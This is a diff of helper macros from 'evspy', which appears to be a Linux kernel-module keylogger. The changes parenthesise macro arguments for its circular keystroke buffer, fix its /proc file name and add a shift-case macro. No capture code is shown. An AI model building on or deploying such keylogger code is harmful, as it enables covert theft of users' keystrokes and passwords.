@@ -2,11 +2,11 @@
 #include <linux/input.h>
 #include "maps.h"
 
-#define EVS_NAME		"evspy"			// driver name
-#define EVS_MAP			map_es			// change this to your keyboard layout
-#define EVS_TROLL		1				// clear this if you're a serious guy
-#define EVS_BUFSIZE		PAGE_SIZE		// size of the circular buffer (4K)
-#define EVS_PROCNAME	"driver/" EVS	// virtual file within /proc
+#define EVS_NAME		"evspy"				// driver name
+#define EVS_MAP			map_es				// change this to your keyboard layout
+#define EVS_TROLL		1					// clear this if you're a serious guy
+#define EVS_BUFSIZE		PAGE_SIZE			// size of the circular buffer (4K)
+#define EVS_PROCNAME	"driver/" EVS_NAME	// virtual file within /proc
 
 #define MIN(x, y)	(x) < (y) ? (x) : (y)
 
@@ -16,11 +16,11 @@
  */
 #define evs_incp(p)		\
 ({		\
-	if (p == &buffer[EVS_BUFSIZE-1])		\
-		p = buffer;		\
+	if ((p) == &buffer[EVS_BUFSIZE-1])		\
+		(p) = buffer;		\
 	else		\
-		p++;		\
- 	p;		\
+		(p)++;		\
+ 	(p);		\
 })
 
 /*
@@ -28,11 +28,11 @@
  */
 #define evs_decp(p)		\
 ({		\
-	if (p == buffer)		\
-		p = &buffer[EVS_BUFSIZE-1];		\
+	if ((p) == buffer)		\
+		(p) = &buffer[EVS_BUFSIZE-1];		\
 	else		\
-		p--;		\
- 	p;		\
+		(p)--;		\
+ 	(p);		\
 })
 
 /*
@@ -41,7 +41,7 @@
  */
 #define evs_insert(c)		\
 ({		\
-	*wrp = c;		\
+	*wrp = (c);		\
 	if (evs_incp(wrp) == rdp)		\
 		evs_incp(rdp);		\
 })
@@ -58,11 +58,16 @@
 /*
  * Is the c event code associated to any of the FX buttons?
  */
-#define evs_isfX(c)		\
+#define evs_isfX(c)			\
 ({		\
-	(c >= KEY_F1 && c <= KEY_F10) ||		\
-	(c == KEY_F11 || c == KEY_F12) ||		\
-	(c >= KEY_F13 && c <= KEY_F24);		\
+	((c) >= KEY_F1 && (c) <= KEY_F10) ||		\
+	((c) == KEY_F11 || (c) == KEY_F12) ||		\
+	((c) >= KEY_F13 && (c) <= KEY_F24);		\
+})
+
+#define evs_shift(c)		\
+({		\
+	((c) >= 'a' && (c) <= 'z') ? (c) + ('A'-'a') : (c);		\
 })
 
 // Event values
